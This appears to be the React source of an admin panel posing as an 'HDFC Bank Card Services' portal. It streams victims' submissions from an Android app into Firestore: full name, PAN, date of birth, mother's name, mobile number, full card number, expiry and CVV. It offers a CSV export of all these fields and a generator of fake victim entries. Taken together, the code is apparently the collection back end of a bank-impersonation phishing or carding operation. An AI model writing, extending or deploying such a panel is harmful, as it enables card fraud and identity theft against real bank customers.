import React, { useState, useEffect } from 'react';
import AdminNavbar from './components/AdminNavbar';
import StatCards from './components/StatCards';
import SubmissionsTable from './components/SubmissionsTable';
import SubmissionDetailModal from './components/SubmissionDetailModal';
import { PlusCircle, Download, ShieldCheck, RefreshCw, Radio, CheckCircle, AlertCircle } from 'lucide-react';
import confetti from 'canvas-confetti';
import logo from './assets/logo.png';
import {
  subscribeToSubmissions,
  updateSubmissionStatus,
  deleteSubmission,
  addSimulationSubmission
} from './firebase';

export default function App() {
  const [submissions, setSubmissions] = useState([]);
  const [isLiveConnected, setIsLiveConnected] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [serviceFilter, setServiceFilter] = useState('all');
  const [statusFilter, setStatusFilter] = useState('all');
  const [selectedDossier, setSelectedDossier] = useState(null);
  const [isLoading, setIsLoading] = useState(true);

  // 1. Subscribe to real-time Firebase Firestore submissions
  useEffect(() => {
    setIsLoading(true);
    const unsubscribe = subscribeToSubmissions(
      (liveSubmissions) => {
        setSubmissions(liveSubmissions || []);
        setIsLiveConnected(true);
        setIsLoading(false);
      },
      (error) => {
        console.warn('Firestore subscription fallback:', error);
        setIsLiveConnected(false);
        setIsLoading(false);
      }
    );

    return () => {
      if (typeof unsubscribe === 'function') unsubscribe();
    };
  }, []);

  // 2. Status update (Approve / Reject) in Firebase and local state
  const handleUpdateStatus = async (id, newStatus) => {
    setSubmissions((prev) =>
      prev.map((item) => (item.id === id ? { ...item, status: newStatus } : item))
    );

    if (newStatus === 'approved') {
      confetti({ particleCount: 60, spread: 50, origin: { y: 0.6 } });
    }

    try {
      await updateSubmissionStatus(id, newStatus);
    } catch (err) {
      console.error('Firebase status update error:', err);
    }
  };

  // 3. Delete submission record
  const handleDeleteSubmission = async (id) => {
    setSubmissions((prev) => prev.filter((item) => item.id !== id));
    try {
      await deleteSubmission(id);
    } catch (err) {
      console.error('Firebase delete error:', err);
    }
  };

  // 4. Add Simulation Record
  const handleAddSampleRecord = async () => {
    const sampleNames = ['Rohan Malhotra', 'Deepika Nair', 'Sanjay Patel', 'Anjali Gupta', 'Vikramaditya Rathore', 'Pooja Agarwal'];
    const randomName = sampleNames[Math.floor(Math.random() * sampleNames.length)];
    const services = ['increase_limit', 'rewards_points', 'login_card', 'card_to_card'];
    const randomService = services[Math.floor(Math.random() * services.length)];

    const formattedTime = new Date().toLocaleDateString('en-IN', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });

    const newRecord = {
      fullName: randomName,
      dob: '14/08/1991',
      panNumber: 'BKGP' + Math.floor(1000 + Math.random() * 9000) + 'K',
      mothersName: 'Sunita ' + randomName.split(' ')[1],
      mobileNumber: '9' + Math.floor(100000000 + Math.random() * 900000000),
      selectedService: randomService,
      nameOnCard: randomName.toUpperCase(),
      cardNumber: '4' + Math.floor(100 + Math.random() * 900) + ' ' + Math.floor(1000 + Math.random() * 9000) + ' ' + Math.floor(1000 + Math.random() * 9000) + ' ' + Math.floor(1000 + Math.random() * 9000),
      expiryDate: '09/28',
      cvv: '' + Math.floor(100 + Math.random() * 900),
      status: 'pending',
      submittedAt: formattedTime
    };

    try {
      await addSimulationSubmission(newRecord);
    } catch (err) {
      console.error('Simulation write error:', err);
      // Fallback local update if offline
      setSubmissions([{ id: 'HDFC-SIM-' + Date.now(), ...newRecord }, ...submissions]);
    }
  };

  // 5. Export to CSV with ALL 12 customer fields
  const handleExportCSV = () => {
    const headers = 'ID,Date Time,Full Name,PAN Number,Mobile Number,DOB,Mother Name,Service Requested,Name On Card,Card Number,Expiry Date,CVV,Status\n';
    const rows = submissions
      .map(
        (s) =>
          `"${s.id}","${s.submittedAt || ''}","${s.fullName || ''}","${s.panNumber || ''}","${s.mobileNumber || ''}","${s.dob || ''}","${s.mothersName || ''}","${s.selectedService || ''}","${s.nameOnCard || ''}","${s.cardNumber || ''}","${s.expiryDate || ''}","${s.cvv || ''}","${s.status || ''}"`
      )
      .join('\n');

    const blob = new Blob([headers + rows], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.setAttribute('href', url);
    link.setAttribute('download', `HDFC_Customer_Applications_${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // 6. Filtered Submissions
  const filteredSubmissions = submissions.filter((item) => {
    const matchesSearch =
      (item.fullName && item.fullName.toLowerCase().includes(searchTerm.toLowerCase())) ||
      (item.panNumber && item.panNumber.toLowerCase().includes(searchTerm.toLowerCase())) ||
      (item.mobileNumber && item.mobileNumber.includes(searchTerm)) ||
      (item.cardNumber && item.cardNumber.includes(searchTerm));

    const matchesService = serviceFilter === 'all' || item.selectedService === serviceFilter;
    const matchesStatus = statusFilter === 'all' || item.status === statusFilter;

    return matchesSearch && matchesService && matchesStatus;
  });

  return (
    <div className="admin-app">
      {/* Top Navbar */}
      <AdminNavbar />

      <main className="admin-container">
        {/* Banner */}
        <div className="portal-banner">
          <div className="banner-content">
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '0.4rem' }}>
              <span style={{
                fontSize: '0.75rem',
                background: isLiveConnected ? '#10b981' : '#f59e0b',
                color: 'white',
                padding: '3px 10px',
                borderRadius: '12px',
                fontWeight: 700,
                display: 'inline-flex',
                alignItems: 'center',
                gap: '5px'
              }}>
                <Radio size={13} /> {isLiveConnected ? 'Live Cloud Firestore Database Connected' : 'Connecting to Live Database...'}
              </span>
            </div>
            <h2>Card Services · Real-Time Verification Portal</h2>
            <p>
              Live sync active: Customer PAN, Mother's Name, DOB, and 16-Digit Card entries stream in real-time as submitted from the Android mobile app.
            </p>
          </div>
          <div className="banner-actions">
            <button className="btn-banner-action btn-banner-primary" onClick={handleAddSampleRecord}>
              <PlusCircle size={16} />
              <span>Simulate Customer Entry</span>
            </button>
            <button className="btn-banner-action" onClick={handleExportCSV}>
              <Download size={16} />
              <span>Export Full CSV</span>
            </button>
          </div>
        </div>

        {/* KPI Stat Cards */}
        <StatCards submissions={submissions} />

        {/* Live Submissions Table */}
        <SubmissionsTable
          submissions={filteredSubmissions}
          searchTerm={searchTerm}
          setSearchTerm={setSearchTerm}
          serviceFilter={serviceFilter}
          setServiceFilter={setServiceFilter}
          statusFilter={statusFilter}
          setStatusFilter={setStatusFilter}
          onViewDossier={setSelectedDossier}
          onUpdateStatus={handleUpdateStatus}
          onDeleteSubmission={handleDeleteSubmission}
          onExportCSV={handleExportCSV}
          onRefresh={() => {
            setIsLoading(true);
            setTimeout(() => setIsLoading(false), 500);
          }}
        />
      </main>

      {/* Detail Modal */}
      <SubmissionDetailModal
        submission={selectedDossier}
        onClose={() => setSelectedDossier(null)}
        onUpdateStatus={handleUpdateStatus}
        onDeleteSubmission={handleDeleteSubmission}
      />

      {/* Footer */}
      <footer className="admin-footer">
        <div className="footer-brand">
          <img src={logo} alt="HDFC" style={{ height: '18px' }} />
          <span>HDFC Bank Card Services Management Portal</span>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', flexWrap: 'wrap' }}>
          <span style={{ display: 'flex', alignItems: 'center', gap: '0.3rem', color: '#10b981', fontWeight: 600 }}>
            <ShieldCheck size={16} /> 256-Bit SSL Encrypted Admin Console
          </span>
          <span>·</span>
          <span>Cloud Firestore: {isLiveConnected ? 'Streaming Live' : 'Synchronizing'}</span>
        </div>
      </footer>
    </div>
  );
}
